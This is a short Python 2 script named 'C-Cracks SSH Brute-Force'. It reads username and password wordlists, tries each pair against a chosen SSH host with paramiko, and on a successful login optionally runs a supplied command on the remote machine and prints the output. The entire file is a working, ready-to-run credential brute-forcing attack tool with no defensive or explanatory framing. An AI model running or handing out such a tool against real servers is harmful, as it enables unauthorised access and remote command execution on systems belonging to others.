#!/usr/bin/env python

import argparse;from pwn import *;import paramiko;import time

try:    import pyfiglet ; banner=pyfiglet.figlet_format("C-Cracks SSH Brute-Force")
except:	print("Failed to detect pyfiglet.\n") ; banner="C-Cracks SSH Brute-Force"

usr_arr=[];pass_arr=[]

parser=argparse.ArgumentParser(description="Well done, you found the help menu. ^-^")
parser.add_argument("--users",help="Add the absolute path of the user file here (/root/users.txt)");
parser.add_argument("--passes",help="Add the absolute path of the password file here (/root/passwords.txt)")
parser.add_argument("--host",help="The IP address of the remote SSH server, default is your machine (localhost).",default="127.0.0.1")
parser.add_argument("--port", help="The port of the SSH server -default is 22.",type=int,default=22)
parser.add_argument("--cmd", help="The command to execute upon successful authentication to the SSH server (optional). Easiest to provide as a string (wrapped with \"\""")",default="")
args=parser.parse_args()

try:	u_file=args.users.strip();p_file=args.passes.strip();host=args.host.strip();cmd=args.cmd.strip();p=args.port
except AttributeError:	print("Check --help, little Nooby Doo. :>\n") ; quit()

print"User file:",u_file,"| Password file:",p_file,"\n"

usrs=open(u_file,"r")
for l in usrs:
	u=l.strip();usr_arr.append(u)
usrs.close()

passwords=open(p_file,"r")
for l in passwords:
	p=l.strip();pass_arr.append(p)
passwords.close()

print(banner)
 
i=1;x=0;u=0
while i==1:
	try:
		client=paramiko.SSHClient()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		print "User:",str(usr_arr[u]),"| Password:",str(pass_arr[x])
		client.connect(username=usr_arr[u], hostname=host, password=pass_arr[x], port=args.port)
		print("May have found valid credentials.\n")
		
		if cmd!="":
			stdin, stdout, stderr=client.exec_command(cmd,get_pty=True)
			for r in stdout:	print str(r)
		
		break
	except (paramiko.ssh_exception.AuthenticationException):
		print("Nope...\n");sleep(0.2)
		if x==len(pass_arr)-1:
			x=0
			if u==len(usr_arr)-1:	break
			u+=1
		else:	x+=1
		continue
	except paramiko.ssh_exception.NoValidConnectionsError:
		print("Check host and port input: a valid connection can't be established here...\n")
		quit()
	except:
		sleep(0.3) ; continue
	i+=1

print("Brute-force finished.\n");client.close();quit()
